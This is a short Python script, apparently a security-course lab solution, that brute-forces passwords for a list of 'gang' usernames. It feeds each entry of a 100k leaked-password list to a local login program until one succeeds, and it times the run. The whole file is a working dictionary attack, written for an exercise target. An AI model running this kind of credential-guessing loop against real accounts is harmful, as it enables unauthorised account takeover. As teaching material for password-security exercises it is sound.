import subprocess
import time                                                                                                                                                                                                                                                                                                             

found = set(["SkyRedFalcon914", "MontainBlueFalcon157"])
user_path = "../Q3/gang"
passwd_path = "../Q3/PwnedPWs100k"
gang_queue = []

# construct a queue of the remaining gang's usernames 
with open(user_path, "r") as file:
    for row in file:
        user = row.strip()

        if user not in found:
            gang_queue.append(user)

def find_a_pass(gang_queue):
    ''' checks the gang members' usernames with all common passwords in order until a correct password is found '''
    with open(passwd_path, "r") as file:  

        for user in gang_queue: 

            for passwd in file:                                                                                                                                            
                passwd = passwd.strip()                                                      
                check = subprocess.run(["python3", "../Q3/Login.pyc", user, passwd], capture_output=True, text=True) 

                if check.stdout[6] == "s": return       # Login [s]ucessful is the only output with s at idx 6 
            
            # Reset pointer for next iter.
            file.seek(0)

start = time.time()
find_user = find_a_pass(gang_queue)
end = time.time()

print(f"Start: {start} End: {end} Elapsed: {end-start}") 
